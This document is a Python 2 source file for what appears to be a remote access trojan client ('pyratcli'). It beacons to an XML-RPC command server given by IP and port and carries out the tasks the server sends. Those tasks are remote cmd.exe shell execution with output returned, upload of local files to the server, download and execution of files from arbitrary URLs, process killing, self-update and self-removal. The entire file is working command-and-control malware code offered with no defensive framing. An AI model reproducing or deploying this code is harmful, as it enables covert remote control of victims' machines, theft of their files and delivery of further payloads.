#! /usr/bin/env python
#coding=utf-8

import xmlrpclib
import time, subprocess
import urllib, urllib2
import os, shutil, sys
import pyratfc

class XmlCli():
    PYRAT_CLIENT_VERSION = '0.1.0'

    def __init__(self, svr):
        self.cmdmap = {
            'cmdshell': self.cmdshell,
            'update': self.update,
            'download': self.download,
            'runexec': self.runexec,
            'upload': self.upload,
            'terminate': self.terminate_proc,
            'uninstall': self.uninstall
        }
        self.svr = svr
        self.hello()

    def hello(self):
        self.id = pyratfc.GetClientId()
        info = pyratfc.GetClientInfo()

        while True:
            try:
                self.cli = xmlrpclib.ServerProxy(self.svr, allow_none=True)
                self.cli.hello(self.id, XmlCli.PYRAT_CLIENT_VERSION, info)
                break
            except Exception as e:
                print e
                time.sleep(1)
                continue

    def run(self):    
        while True:
            try:
                task = self.cli.get_task(self.id)
                if task:
                    #print task
                    (tid, cid, task, argv, ttime) = task
                    #for debug
                    #if task == 'quit':
                    #    break
                    #ret = eval("cli."+task+"()")
                    method = self.cmdmap.get(task)
                    if method:
                        (ret, data) = method(argv)
                        self.cli.resp_task(cid, tid, task, argv, ret, data)
                    
                time.sleep(0.01)
            except Exception as e:
                print e
                self.hello()

        self.close()

    def close(self):
        self.cli.close(self.id)

    def __write_file(self, path, data):
        f = file(path, 'wb')
        f.write(data)
        f.close()

    def __read_file(self, path):
        f = file(path, 'rb')
        d = f.read()
        f.close()
        return d

    def uninstall(self, argv):
        try:
            os.remove("pyratcli.exe")
            os._exit(0)            
            return (True, "")
        except Exception as e:
            return (False, str(e))

    def update(self, url):
        try:
            req = urllib.urlopen(url)
            data = req.read()
            self.__write_file('tmp', data)
            os.remove("pyratcli.exe")
            shutil.move('tmp', 'pyratcli.exe')
            cmd = 'pyratcli.exe'
            self.runexec(cmd)
            return (True, '')
        except Exception as e:
            return (False, str(e))

    def download(self, argv):
        try:
            (dtype, url, path) = argv.split(' ')
            if dtype == 'net':
                req = urllib.urlopen(url)
                data = req.read()
            elif dtype == 'local':
                (ret, data) = self.cli.download(url)
                if not ret:
                    return (False, data)
                data = data.data
            else:
                return (False, 'Unknow:' + dtype)
            self.__write_file(path, data)
            return (True, 'download success')
        except Exception as e:
            return (False, str(e))

    def upload(self, argv):
        try:
            path = argv
            data = self.__read_file(path)
            return (True, xmlrpclib.Binary(data))
        except Exception as e:
            return (False, str(e))
    
    def cmdshell(self, cmd):
        try:
            cmd = 'cmd.exe /c %s &' % cmd
            log = 'cmd.log'
            p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
            p.wait()
            data = self.__read_file(log)
            return (True, xmlrpclib.Binary(data))
        except Exception as e:
            return (False, str(e))

    def runexec(self, path):
        try:
            subprocess.Popen(path)
            return (True, '')
        except Exception as e:
            return (False, str(e))

    def terminate_proc(self, argv):
        try:
            (ptype, val) = argv.split(' ')
            ptype = '/PID' if ptype == 'pid' else '/IM'
            cmd = 'cmd.exe /c taskkill %s %s' % (ptype, val)
            log = 'cmd.log'
            p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
            p.wait()
            data = self.__read_file(log)
            return (True, xmlrpclib.Binary(data))
        except Exception as e:
            return (False, str(e))

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print 'usage: pyratcli.exe ip port'
        os._exit(0)
    url = "http://%s:%s" % (sys.argv[1], sys.argv[2])
    xc = XmlCli(url)
    xc.run()
    
    
    